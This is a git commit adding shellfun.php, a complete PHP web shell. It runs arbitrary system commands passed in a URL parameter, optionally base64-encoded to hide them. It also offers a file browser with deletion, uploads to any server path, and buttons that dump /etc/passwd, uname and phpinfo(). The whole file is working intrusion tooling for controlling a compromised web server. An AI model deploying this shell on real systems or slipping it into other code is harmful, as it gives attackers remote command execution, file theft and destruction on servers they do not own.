514b6de8e8ea3f219912ea8371ff033aec1ac52d
dual <github@getdual.neomailbox.net>
2015-04-21 10:41:23 -0700

    added shellfun.php

---
+++ shellfun.php
@@ -0,0 +1,126 @@
+<?php
+
+// shellfun.php
+// WSTN
+// 2015-04-20
+
+
+//@error_reporting(0);
+
+
+// run system commands
+empty($_GET['cmd']) ? print '<strong>no shell command passed</strong>' : print '<strong>command: ' . htmlentities($_GET['cmd']) . '</strong>';
+echo '<pre>';
+$b64_regex = '#^[A-Za-z0-9+/]+={0,2}$#';
+if (isset($_GET['cmd'])) {
+    if (preg_match($b64_regex, $_GET['cmd'])) {
+        system(base64_decode($_GET['cmd']));
+    } else {
+        system($_GET['cmd']);
+    }
+}
+echo '</pre><br><hr><br>';
+
+
+// file manager
+echo '<strong>file manager</strong><br><br>';
+echo '<form action="" method="post">';
+echo '  <input type="text" name="ls_path" value="'.getcwd().'">';
+echo '  <input type="submit" name="ls_dir" value="ls dir">';
+echo '</form>';
+if (isset($_POST['ls_path'])) {
+    $ls_path = $_POST['ls_path'];
+    $files = scandir($ls_path);
+    echo 'ls of '.htmlentities($ls_path).'<br><br>';
+    echo '<form action="" method="post"><table>';
+    for ($i=0; $i < count($files); $i++) {
+        if ($files[$i] != '.' && $files[$i] != '..' ) {
+            if (is_dir("$ls_path/$files[$i]")) {
+                echo '<tr><td><input type="checkbox" name="file_delete[]" value="'.$files[$i].'"><font color="blue">'.$files[$i].'</font></td></tr>';
+            } else {
+                echo '<tr><td><input type="checkbox" name="file_delete[]" value="'.$files[$i].'">'.$files[$i].'</td></tr>';
+            }
+        }
+    }
+}
+
+echo '</table><br><input type="submit" name="delete_button" value="file delete"></form><br><br>';
+
+if (isset($_POST['delete_button'])) {
+    foreach ($_POST['file_delete'] as $deleted) {
+        unlink($deleted);
+        echo '<br>'.htmlentities($deleted).' deleted<br>';
+    }
+}
+
+echo '<hr><br>';
+
+
+// file upload
+echo <<<EOD
+<strong>file upload</strong><br><br>
+<form enctype="multipart/form-data" action="" method="post">
+  <label>target path</label><br>
+EOD;
+echo '  <input type="text" name="target_path" value="'.getcwd().'">';
+echo <<<EOD
+  <input type="file" name="file_upload">
+  <input type="submit" name="upload" value="Upload">
+</form>
+EOD;
+
+if (isset($_POST['target_path']) && isset($_FILES['file_upload']['name'])) {
+    $target_file = $_POST['target_path'].'/'.$_FILES['file_upload']['name'];
+}
+
+if (isset($_POST['upload'])) {
+    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
+        echo 'file uploaded: ' . htmlentities($target_file);
+    } else {
+        echo 'upload error';
+    }
+}
+
+
+// function buttons
+echo '<br><hr><br><strong>functions</strong><br><br>';
+
+// uname
+echo <<<EOD
+<form action="" method="post">
+  <button type="submit" name="uname_button">uname</button>
+</form><br>
+EOD;
+
+if (isset($_POST['uname_button'])) {
+    echo '<pre>';
+    echo php_uname();
+    echo '</pre><br><br>';
+}
+
+// /etc/passwd
+echo <<<EOD
+<form action="" method="post">
+  <button type="submit" name="passwd_button">/etc/passwd</button>
+</form><br>
+EOD;
+
+if (isset($_POST['passwd_button'])) {
+    $etc_passwd = shell_exec('cat /etc/passwd');
+    echo '<pre>';
+    echo $etc_passwd;
+    echo '</pre><br><br>';
+}
+
+// phpinfo()
+echo <<<EOD
+<form action="" method="post">
+  <button type="submit" name="phpinfo_button">phpinfo()</button>
+</form><br>
+EOD;
+
+if (isset($_POST['phpinfo_button'])) {
+    phpinfo();
+}
+
+?>
